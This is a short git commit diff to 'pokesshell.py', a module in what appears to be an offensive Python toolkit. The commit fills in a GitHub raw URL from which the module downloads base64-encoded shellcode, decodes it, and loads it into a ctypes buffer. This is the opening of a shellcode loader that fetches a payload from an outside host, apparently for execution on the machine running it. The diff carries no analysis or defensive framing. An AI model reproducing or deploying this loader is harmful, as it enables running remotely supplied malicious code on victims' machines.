6ea2ec90b117a035cd28d6128321bf4592ebf80b
apokalito <apokalito@Apokalypse.edu>
2020-03-11 20:43:14 +0400

    Adding new modules

--- modules/pokesshell.py
+++ modules/pokesshell.py
@@ -4,7 +4,7 @@ import base64
 def run(** args):
 	print "In pokess module"
 
-	url = "imput download url"
+	url = "https://github.com/apokalitos/apokalypse/raw/master/config/pokesshell.raw"
 	response = urllib2.urlopen(url)
 	shellcode = base64.b64decode(response.read())
 	shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
